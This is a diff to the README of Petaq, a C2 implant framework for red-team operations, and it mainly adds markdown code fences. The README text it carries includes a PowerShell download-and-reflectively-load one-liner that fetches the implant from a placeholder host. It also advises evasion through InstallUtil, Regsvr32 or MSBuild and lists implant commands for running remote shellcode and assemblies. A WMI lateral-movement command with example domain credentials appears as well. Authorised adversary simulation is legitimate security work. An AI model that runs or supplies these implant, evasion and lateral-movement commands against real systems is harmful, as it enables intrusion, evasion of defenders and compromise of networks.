@@ -16,13 +16,15 @@ http://www.klingonwiki.net/En/Cursing
 
 # Version
 * 0.1 - 3 June 2020
-** Initial release
+```Initial release```
+```
 * 0.2 - 18 August 2020
-** Scenario and TTP support added
-** File operations (upload/download) added
-** Several bugs fixed including transmission buffers
-** Powershell through .NET System Automation added
-** Commands are now supporting "file" to send the binaries/scripts through the C2 channels
+* Scenario and TTP support added
+* File operations (upload/download) added
+* Several bugs fixed including transmission buffers
+* Powershell through .NET System Automation added
+* Commands are now supporting "file" to send the binaries/scripts through the C2 channels
+```
 
 # Features
 Scenario Support
@@ -75,7 +77,9 @@ The malware needs to be compiled using .NET Framework as it has inline .NET comp
 
 # Deployment to the Victims
 Even though it's too noisy, running the following Powershell line would load the compiled Petaq Implant as reflected assembly for testing. You can compile the Petaq Implant as above, then place it into the wwwroot folder of Petaq Service as index.html. So the url would point to the binary to load directly.
+```
 powershell –c $m=new-object net.webclient;$Url='http://PETAQIMPLANTHOSTEDSITE/';$dba=$m.downloaddata($Url);$a=[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))
+```
 
 I suggest you to some operational security measures for any production or evasive testing. 
 * Consider InstallUtil, Regsvr32, RegAsm, DotNettoJs, RunDLL32, WMI or MSBuild for evasive initial execution.
@@ -83,7 +87,7 @@ I suggest you to some operational security measures for any production or evasiv
 * Consider replacing some Petaq words in the source code. Even though currently 
 
 # In Action
-
+```
 2020-5-18---16-41-36
 Hosting environment: Development
 Content root path: /tmp/petaqC2/petaqservice
@@ -114,20 +118,30 @@ Session ID		User Name		Hostname	IP Address	Status		Link URI
 \# exit
 Also use CTRL+C for stopping the implant services.
 CApplication is shutting down...
+```
 
 # Usage Examples
 Petaq Implant Run Arguments:
-    It runs Petaq Implants to connect to a Petaq Service using Websocket (If not configured on Configuration.cs)
+1. It runs Petaq Implants to connect to a Petaq Service using Websocket (If not configured on Configuration.cs)
+```
     petaqimplant.exe ws://172.16.121.1/ws
     petaqimplant.exe wss://172.16.121.1:443/ws (SSL)
-    It runs Petaq Implant on TCP 8000 and wait for another implant to link it to the Petaq Service
-    petaqimplant.exe tcp 8000 
-    It runs Petaq Implant on UDP 8000 and wait for another implant to link it to the Petaq Service
-    petaqimplant.exe udp 8000 
-    It runs Petaq Implant on SMB Named Pipe pipename1 and wait for another implant to link it to the Petaq Service
-    petaqimplant.exe smb pipename1 
+```
+2. It runs Petaq Implant on TCP 8000 and wait for another implant to link it to the Petaq Service
+```
+   petaqimplant.exe tcp 8000
+```
+3. It runs Petaq Implant on UDP 8000 and wait for another implant to link it to the Petaq Service
+```
+    petaqimplant.exe udp 8000
+```
+4. It runs Petaq Implant on SMB Named Pipe pipename1 and wait for another implant to link it to the Petaq Service
+```
+   petaqimplant.exe smb pipename1
+```
 
 Petaq Service Commands:
+```
     Help:
         help
     List the Implants:
@@ -141,10 +155,11 @@ Petaq Service Commands:
     Exit:
         exit
         terminate
-
+```
 Practical Examples on Petaq Implant in Interaction (use ImplantID):
-    Usage Examples:
-        exec cmd /c dir
+```
+Usage Examples:
+	exec cmd /c dir
         exec net use
         exec powershell -c Write-Output($env:UserName)
         exec-sharpassembly url http://127.0.0.1/Seatbelt.exe BasicOSInfo
@@ -158,45 +173,46 @@ Practical Examples on Petaq Implant in Interaction (use ImplantID):
         link smb://127.0.0.1
         link smb://127.0.0.1/petaq_comm
 
-    Link operations:
-        route
+Link operations:
+	route
         sessions
         link URI
         unlink ID
 
-    Lateral movement:
-        lateralmovement wmiexec domain=galaxy username=administrator password=Password3 host=10.0.0.1 command="powershell –c $m = new- object net.webclient;$Url = 'http://172.16.121.1';$dba =$m.downloaddata($Url);$a =[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))"
+Lateral movement:
+	lateralmovement wmiexec domain=galaxy username=administrator password=Password3 host=10.0.0.1 command="powershell –c $m = new- object net.webclient;$Url = 'http://172.16.121.1';$dba =$m.downloaddata($Url);$a =[System.Reflection.Assembly]::Load($dba); $a.EntryPoint.Invoke(0,@(,[string[]]@()))"
 
-    Execute a command/binary:
-        exec cmd.exe /c dir
+Execute a command/binary:
+	exec cmd.exe /c dir
         exec powershell -c Write-Output($env:UserName)
 
-    Execute a command/binary/assembly as a thread (no wait, no output):
-        execthread cmd.exe /c dir
+Execute a command/binary/assembly as a thread (no wait, no output):
+	execthread cmd.exe /c dir
         execthread powershell -c Write-Output($env:UserName)
         execthread-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
         execthread-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters
         execthread-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
         execthread-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters
 
-    Inline run for .NET source code:
-        exec-sharpdirect SHARPCODE
+Inline run for .NET source code:
+	exec-sharpdirect SHARPCODE
         exec-sharpdirect base64 BASE64_ENCODED_SHARPCODE
 
-    Execute a .NET assembly:
-        exec-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
+Execute a .NET assembly:
+	exec-sharpassembly url http://127.0.0.1/Assembly.exe Parameters
         exec-sharpassembly base64 http://127.0.0.1/Assembly.b64 Parameters
 
-    Compile & Execute .NET source code:
-        exec-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
+Compile & Execute .NET source code:
+	exec-sharpcode url http://127.0.0.1/Sharpcode.src Parameters
         exec-sharpcode base64 BASE64_ENCODED_SHARPCODE Parameters
-        
-    Execute Shellcode:
-        exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH64 T1
+
+Execute Shellcode:
+	exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH64 T1
         exec-shellcode url http://127.0.0.1/Shellcode.bin ARCH32 T2
         exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH64 T1
         exec-shellcode base64 http://127.0.0.1/Shellcode.b64 ARCH32 T2
-        
-    Exit:
+
+Exit:
         exit
         terminate
+```
